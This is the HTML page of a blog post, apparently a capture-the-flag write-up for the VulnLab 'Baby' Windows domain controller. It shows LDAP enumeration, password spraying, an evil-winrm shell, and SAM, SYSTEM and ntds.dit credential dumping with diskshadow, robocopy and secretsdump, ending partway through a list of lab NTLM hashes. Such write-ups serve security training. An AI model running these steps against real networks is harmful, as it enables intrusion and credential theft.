<!DOCTYPE html>
<html lang="en-us" data-theme="light">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>
  Vulnlab : Baby Easy - l0key blog
</title>



<meta name="description" content="This is a writeup for the VulnLab Baby easy machine. We&rsquo;ll be dealing with a Windows environment where we&rsquo;ll need to use LDAP enumeration and the …" />



<meta
  property="og:title"
  content="Vulnlab : Baby Easy"
/>
<meta
  property="og:description"
  content="This is a writeup for the VulnLab Baby easy machine. We&rsquo;ll be dealing with a Windows environment where we&rsquo;ll need to use LDAP enumeration and the …"
/>
<meta
  property="og:type"
  content="article"
/>
<meta property="og:url" content="http://localhost:1313/posts/baby/vulnlab_baby/" />
<meta property="og:site_name" content="l0key blog" />


<meta name="twitter:card" content="summary_large_image" />
<meta
  name="twitter:title"
  content="Vulnlab : Baby Easy"
/>
<meta
  name="twitter:description"
  content="This is a writeup for the VulnLab Baby easy machine. We&rsquo;ll be dealing with a Windows environment where we&rsquo;ll need to use LDAP enumeration and the …"
/>


<link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link
  href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Orbitron:wght@400;700&family=JetBrains+Mono:wght@400;500&display=swap"
  rel="stylesheet"
/>


<link
  rel="stylesheet"
  href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
/>


<link rel="stylesheet" href="http://localhost:1313/css/style.css">
<link rel="stylesheet" href="/css/custom.css">
<script src="/js/image-zoom.js"></script>



</head>
<body>
    
    <div class="reading-progress"></div>
    

    

    <main>
        

<div class="post-overlay active">
    <div class="post-overlay-backdrop"></div>
    <div class="post-overlay-content" style="position: relative; min-height: 100vh; padding: 0; transform: translateY(0);">
        <div class="post-overlay-header">
            <div class="post-overlay-title">
                <a href="/" class="overlay-site-title">l0key blog</a>
            </div>
            <button class="post-overlay-close" aria-label="Close post" onclick="window.location.href='/'">
                <i class="fas fa-times"></i>
            </button>
        </div>
        <div class="post-layout">
        <article class="post-content">
            <header class="post-header">
                <div class="post-meta">
                    <span class="post-date">2025.10.12</span>
                    <div class="reading-time-post">
                        <span class="coffee-cups">
                            
                            
                            
                            
                                
                            
                            
                                
                            
                                
                            
                                
                            
                                
                            
                                
                            
                            ☕☕☕☕☕
                        </span>
                        <span>6 min read</span>
                    </div>
                </div>
                <h1 class="post-title">Vulnlab : Baby Easy</h1>
                

                
                <div class="post-tags-header">
                    
                    <a href="http://localhost:1313/tags/misc" class="post-tag">misc</a>
                    
                </div>
                
            </header>
            <div class="post-body">
                <p>This is a writeup for the VulnLab Baby easy machine. We&rsquo;ll be dealing with a Windows environment where we&rsquo;ll need to use LDAP enumeration and the password spraying technique.</p>
<h2 id="reconnaissance">Reconnaissance</h2>
<p>A first scan with nmap shows us the following ports:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 12, <span style="color:#ae81ff">2025</span> - 21:17:10 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># nmap -sSV --top-ports=1000 10.10.117.161</span>
</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-10-12 21:17 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.117.161
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.027s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">987</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE       VERSION
</span></span><span style="display:flex;"><span>53/tcp   open  domain        Simple DNS Plus
</span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2025-10-12 19:17:45Z<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>135/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: baby.vl0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds?
</span></span><span style="display:flex;"><span>464/tcp  open  kpasswd5?
</span></span><span style="display:flex;"><span>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>636/tcp  open  tcpwrapped
</span></span><span style="display:flex;"><span>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: baby.vl0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>3269/tcp open  tcpwrapped
</span></span><span style="display:flex;"><span>3389/tcp open  ms-wbt-server Microsoft Terminal Services
</span></span><span style="display:flex;"><span>5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></code></pre></div><p>We&rsquo;re dealing with an Active Directory environment.</p>
<p>We&rsquo;ll start by checking if anonymous bind to LDAP is possible, using the ldapsearch command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 12, <span style="color:#ae81ff">2025</span> - 21:22:36 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># ldapsearch -x -H ldap://baby.vl:3268 -b &#34;DC=baby,DC=vl&#34; &#34;(objectClass=user)&#34; | grep dn</span>
</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Guest,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Jacqueline Barnett,OU<span style="color:#f92672">=</span>dev,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Ashley Webb,OU<span style="color:#f92672">=</span>dev,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Hugh George,OU<span style="color:#f92672">=</span>dev,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Leonard Dyer,OU<span style="color:#f92672">=</span>dev,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Connor Wilkinson,OU<span style="color:#f92672">=</span>it,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Joseph Hughes,OU<span style="color:#f92672">=</span>it,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Kerry Wilson,OU<span style="color:#f92672">=</span>it,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Teresa Bell,OU<span style="color:#f92672">=</span>it,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
</span></span><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Caroline Robinson,OU<span style="color:#f92672">=</span>it,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
</span></span></code></pre></div><p>Indeed, null bind is enabled, so we retrieve a list of users. The next step is to check the description field, which may contain sensitive information:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 12, <span style="color:#ae81ff">2025</span> - 21:24:29 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># ldapsearch -x -H ldap://baby.vl:3268 -b &#34;DC=baby,DC=vl&#34; &#34;(objectClass=user)&#34; | grep desc</span>
</span></span><span style="display:flex;"><span>description: Built-in account <span style="color:#66d9ef">for</span> guest access to the computer/domain
</span></span><span style="display:flex;"><span>description: Set initial password to BabyStart123!
</span></span></code></pre></div><p>Bam! A password!</p>
<p>This password is in Teresa&rsquo;s description. Let&rsquo;s verify if it works:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 12, <span style="color:#ae81ff">2025</span> - 21:26:45 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># nxc smb 10.10.117.161 -u teresa.bell -p &#39;BabyStart123!&#39; --no-bruteforce</span>
</span></span><span style="display:flex;"><span>SMB         10.10.117.161   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:BABYDC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:baby.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.10.117.161   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> baby.vl<span style="color:#ae81ff">\t</span>eresa.bell:BabyStart123! STATUS_LOGON_FAILURE
</span></span></code></pre></div><h2 id="user-flag">User Flag</h2>
<h4 id="password-spraying">Password Spraying</h4>
<p>It doesn&rsquo;t work for this user, so we&rsquo;ll generate a user list from the ones we retrieved with LDAP to perform password spraying:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 12, <span style="color:#ae81ff">2025</span> - 21:32:23 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># nxc smb 10.10.117.161 -u users_list.txt -p &#39;BabyStart123!&#39; --no-bruteforce</span>
</span></span><span style="display:flex;"><span>SMB         10.10.117.161   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:BABYDC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:baby.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.10.117.161   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> baby.vl<span style="color:#ae81ff">\g</span>uest:BabyStart123! STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.10.117.161   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> baby.vl<span style="color:#ae81ff">\j</span>acqueline.barnett:BabyStart123! STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.10.117.161   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> baby.vl<span style="color:#ae81ff">\a</span>shley.webb:BabyStart123! STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.10.117.161   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> baby.vl<span style="color:#ae81ff">\h</span>ugh.george:BabyStart123! STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.10.117.161   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> baby.vl<span style="color:#ae81ff">\l</span>eonard.dyer:BabyStart123! STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.10.117.161   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> baby.vl<span style="color:#ae81ff">\c</span>onnor.wilkinson:BabyStart123! STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.10.117.161   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> baby.vl<span style="color:#ae81ff">\j</span>oseph.hughes:BabyStart123! STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.10.117.161   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> baby.vl<span style="color:#ae81ff">\k</span>erry.wilson:BabyStart123! STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.10.117.161   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> baby.vl<span style="color:#ae81ff">\t</span>eresa.bell:BabyStart123! STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.10.117.161   <span style="color:#ae81ff">445</span>    BABYDC           <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> baby.vl<span style="color:#ae81ff">\c</span>aroline.robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
</span></span></code></pre></div><p>Ok! We have Caroline who needs to have her password BabyStart123! changed:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 12, <span style="color:#ae81ff">2025</span> - 21:34:05 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># smbpasswd -r 10.10.117.161 -U &#34;Caroline.Robinson&#34;</span>
</span></span><span style="display:flex;"><span>Old SMB password:
</span></span><span style="display:flex;"><span>New SMB password:
</span></span><span style="display:flex;"><span>Retype new SMB password:
</span></span><span style="display:flex;"><span>Password changed <span style="color:#66d9ef">for</span> user Caroline.Robinson on 10.10.117.161.
</span></span></code></pre></div><p>Now, we&rsquo;ll connect with WinRM using Caroline&rsquo;s credentials:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>**<span style="color:#f92672">[</span>Oct 12, <span style="color:#ae81ff">2025</span> - 21:35:37 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># evil-winrm -i 10.10.117.161 -u &#39;caroline.robinson&#39; -p &#39;Test123&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
</span></span></code></pre></div><p>We get the user flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\C</span>aroline.Robinson<span style="color:#ae81ff">\D</span>esktop&gt; cat <span style="color:#e6db74">&#34;C:/Users/Caroline.Robinson/Desktop/user.txt&#34;</span>
</span></span><span style="display:flex;"><span>VL<span style="color:#f92672">{</span>b2c6150b85125d32f4b253df9540d898<span style="color:#f92672">}</span>
</span></span></code></pre></div><h2 id="administrator-flag">Administrator Flag</h2>
<h4 id="privilege-escalation">Privilege Escalation</h4>
<p>With <code>whoami /all</code> we can see Caroline&rsquo;s privileges, and we can see that she has SeRestore and SeBackupPrivilege privileges:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\C</span>aroline.Robinson<span style="color:#ae81ff">\D</span>ocuments&gt; whoami /all
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>USER INFORMATION
</span></span><span style="display:flex;"><span>----------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User Name              SID
</span></span><span style="display:flex;"><span><span style="color:#f92672">======================</span> <span style="color:#f92672">==============================================</span>
</span></span><span style="display:flex;"><span>baby<span style="color:#ae81ff">\c</span>aroline.robinson S-1-5-21-1407081343-4001094062-1444647654-1115
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>GROUP INFORMATION
</span></span><span style="display:flex;"><span>-----------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Group Name                                 Type             SID                                            Attributes
</span></span><span style="display:flex;"><span><span style="color:#f92672">==========================================</span> <span style="color:#f92672">================</span> <span style="color:#f92672">==============================================</span> <span style="color:#f92672">==================================================</span>
</span></span><span style="display:flex;"><span>Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\B</span>ackup Operators                   Alias            S-1-5-32-551                                   Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\U</span>sers                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\P</span>re-Windows <span style="color:#ae81ff">2000</span> Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\R</span>emote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\A</span>uthenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\T</span>his Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>BABY<span style="color:#ae81ff">\i</span>t                                    Group            S-1-5-21-1407081343-4001094062-1444647654-1109 Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\N</span>TLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>Mandatory Label<span style="color:#ae81ff">\H</span>igh Mandatory Level       Label            S-1-16-12288
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
</span></span><span style="display:flex;"><span>----------------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Privilege Name                Description                    State
</span></span><span style="display:flex;"><span><span style="color:#f92672">=============================</span> <span style="color:#f92672">==============================</span> <span style="color:#f92672">=======</span>
</span></span><span style="display:flex;"><span>SeMachineAccountPrivilege     Add workstations to domain     Enabled
</span></span><span style="display:flex;"><span>SeBackupPrivilege             Back up files and directories  Enabled
</span></span><span style="display:flex;"><span>SeRestorePrivilege            Restore files and directories  Enabled
</span></span><span style="display:flex;"><span>SeShutdownPrivilege           Shut down the system           Enabled
</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>USER CLAIMS INFORMATION
</span></span><span style="display:flex;"><span>-----------------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User claims unknown.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Kerberos support <span style="color:#66d9ef">for</span> Dynamic Access Control on this device has been disabled.**
</span></span></code></pre></div><p>This will allow us to dump the SAM and SYSTEM hives to retrieve passwords and escalate our privileges:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\T</span>emp&gt; reg save hklm<span style="color:#ae81ff">\s</span>am c:<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\s</span>am
</span></span><span style="display:flex;"><span>The operation completed successfully.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\T</span>emp&gt; reg save hklm<span style="color:#ae81ff">\s</span>ystem c:<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\s</span>ystem
</span></span><span style="display:flex;"><span>The operation completed successfully.
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\T</span>emp&gt; download sam
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\T</span>emp&gt; download system
</span></span></code></pre></div><p>Then with secretsdump we can obtain the administrator hash:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 12, <span style="color:#ae81ff">2025</span> - 21:43:10 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># secretsdump -sam sam -system system LOCAL</span>
</span></span><span style="display:flex;"><span>Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping local SAM hashes <span style="color:#f92672">(</span>uid:rid:lmhash:nthash<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style="display:flex;"><span>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up...
</span></span></code></pre></div><p>Unfortunately, we cannot use this hash because it&rsquo;s for the local administrator, so we cannot use it to connect to the domain controller. We therefore need to obtain a hash for a domain account. To do this, we&rsquo;ll need to dump the ntds.dit database using the Volume Shadow Copy technique. We&rsquo;ll use the following script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set metadata C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\m</span>eta.cabX
</span></span><span style="display:flex;"><span>set context clientaccessibleX
</span></span><span style="display:flex;"><span>set context persistentX
</span></span><span style="display:flex;"><span>begin backupX
</span></span><span style="display:flex;"><span>add volume C: alias cdriveX
</span></span><span style="display:flex;"><span>createX
</span></span><span style="display:flex;"><span>expose %cdrive% E:X
</span></span><span style="display:flex;"><span>end backupX
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>diskshadow /s script.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>robocopy /b E:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\n</span>tds . ntds.dit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>download ntds.dit
</span></span></code></pre></div><p>Then, locally we can extract the hashes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 12, <span style="color:#ae81ff">2025</span> - 21:57:53 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># secretsdump -ntds ntds.dit -system system LOCAL</span>
</span></span><span style="display:flex;"><span>Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> pekList, be patient
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> PEK <span style="color:#75715e"># 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reading and decrypting hashes from ntds.dit
</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style="display:flex;"><span>BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:697f4174d13d804a333879a9410d1ec8:::
</span></span><span style="display:flex;"><span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\J</span>acqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\A</span>shley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\H</span>ugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\L</span>eonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\I</span>an.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\C</span>onnor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\J</span>oseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
</span></span><span style="display:flex;"><span>baby.vl<span style="color:#ae81ff">\K</span>erry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
